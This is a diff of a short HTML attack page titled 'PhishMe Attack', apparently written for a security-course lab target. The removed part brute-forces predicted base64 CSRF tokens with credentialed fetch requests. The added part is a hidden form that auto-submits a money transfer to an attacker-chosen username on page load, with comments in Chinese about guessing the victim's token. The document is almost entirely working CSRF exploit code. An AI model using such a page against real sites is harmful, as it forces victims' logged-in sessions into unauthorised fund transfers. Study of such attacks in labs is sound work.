@@ -1,15 +1,20 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>PhishMe Attack</title>
+</head>
+<body>
+
+<form id="transferForm" action="https://phish-me.quoccacorp.com/api/transfer" method="POST">
+  <input type="hidden" name="csrf_token" value="MjkyMQ==" /> <!-- 这里填Hamish大概率的 token -->
+  <input type="hidden" name="username" value="z5508657" />
+  <input type="hidden" name="amount" value="100" />
+</form>
+
 <script>
-// 尝试预测token序列 (观察到的token解码为2919)
-for(let i = 2920; i < 2930; i++) {
-  const token = btoa(i.toString());
-  fetch('https://phish-me.quoccacorp.com/api/transfer', {
-    method: 'POST',
-    headers: {
-      'Content-Type': 'application/x-www-form-urlencoded',
-      'Origin': 'https://phish-me.quoccacorp.com'
-    },
-    body: `csrf_token=${encodeURIComponent(token)}&username=z5508657&amount=20`,
-    credentials: 'include'
-  });
-}
+document.getElementById('transferForm').submit();
 </script>
+
+</body>
+</html>
